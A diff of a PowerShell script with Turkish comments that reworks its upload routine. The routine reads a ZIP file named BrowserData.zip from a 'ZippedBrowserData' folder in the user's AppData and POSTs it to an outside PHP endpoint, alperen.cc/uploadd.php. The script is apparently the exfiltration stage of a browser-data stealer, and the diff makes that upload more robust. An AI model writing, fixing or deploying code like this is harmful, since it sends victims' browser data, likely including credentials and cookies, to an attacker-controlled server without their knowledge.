@@ -91,32 +91,29 @@ $zipFilePath = "$env:APPDATA\ZippedBrowserData\BrowserData.zip"  # ZIP dosyasın
 $url = "https://alperen.cc/uploadd.php"  # PHP dosya yükleme URL'si
 
 if (Test-Path $zipFilePath) {
-    $filePath = $zipFilePath
-
-    # Dosya içeriğini oku
-    $fileStream = [System.IO.File]::OpenRead($filePath)
-    
-    # Multipart/form-data için boundary oluşturma
-    $boundary = "---------------------------" + [guid]::NewGuid().ToString()
-    $contentType = "multipart/form-data; boundary=$boundary"
-
-    # Body oluşturma
-    $bodyLines = @()
-    $bodyLines += "--$boundary"
-    $bodyLines += "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$($filePath.Split('\')[-1])`""
-    $bodyLines += "Content-Type: application/octet-stream"
-    $bodyLines += ""
-    
-    # Dosya içeriğini ekleme
-    $bodyLines += [System.Text.Encoding]::UTF8.GetString([System.IO.File]::ReadAllBytes($filePath))
-    $bodyLines += "--$boundary--"
-    $bodyLines += ""
-
-    $httpRequestStream = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join "`r`n")
-
-    # POST isteği gönderme
     try {
-        $response = Invoke-RestMethod -Uri $url -Method Post -Body $httpRequestStream -ContentType $contentType -ErrorAction Stop
+        # Read the file content as byte array
+        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
+
+        # Create the form data content with proper boundary
+        $boundary = "---------------------------" + [guid]::NewGuid().ToString()
+        $headers = @{
+            "Content-Type" = "multipart/form-data; boundary=$boundary"
+        }
+        
+        # Create multipart form content
+        $body = (
+            "--$boundary`r`n" +
+            "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$($zipFilePath.Split('\')[-1])`"`r`n" +
+            "Content-Type: application/zip`r`n`r`n" +
+            [System.Text.Encoding]::UTF8.GetString($fileBytes) +
+            "`r`n--$boundary--`r`n"
+        )
+
+        # Send the POST request
+        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType $headers["Content-Type"] -ErrorAction Stop
+
+        # Output the response
         Write-Output $response
     } catch {
         Write-Host "Dosya yüklenirken bir hata oluştu: $_. Exception: $($_.Exception.Message)"
@@ -124,4 +121,3 @@ if (Test-Path $zipFilePath) {
 } else {
     Write-Host "ZIP dosyası bulunamadı: $zipFilePath"
 }
-
